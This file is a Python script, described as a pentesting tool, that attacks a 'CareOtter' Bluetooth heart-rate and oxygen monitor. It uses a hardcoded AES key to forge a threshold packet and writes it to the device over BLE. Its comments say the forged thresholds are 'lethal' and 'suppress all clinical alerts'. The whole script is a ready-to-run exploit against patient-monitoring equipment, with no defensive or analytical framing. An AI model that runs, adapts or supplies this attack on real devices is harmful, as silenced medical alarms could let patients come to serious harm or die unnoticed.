#!/usr/bin/env python3
"""CSCP v1 threshold forger for CareOtter BLE pentesting."""
import asyncio
import struct
import zlib
import sys
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
CSCP_KEY       = b"careotter-key-16"
CSCP_MAGIC     = 0xCAFE0DDA


def forge_packet(bpm_min: int, bpm_max: int, spo2_min: int) -> bytes:
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    crc = zlib.crc32(pt) & 0xFFFFFFFF
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    return struct.pack(">II", CSCP_MAGIC, crc) + ct


async def main():
    device_name = sys.argv[1] if len(sys.argv) > 1 else "CareOtter_HR"
    device = await BleakScanner.find_device_by_name(device_name, timeout=10.0)
    if not device:
        print("[-] Device not found")
        return
    async with BleakClient(device) as c:
        payload = forge_packet(0, 255, 0)   # suppress all clinical alerts
        await c.write_gatt_char(THRESHOLD_UUID, payload)
        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")


if __name__ == "__main__":
    asyncio.run(main())
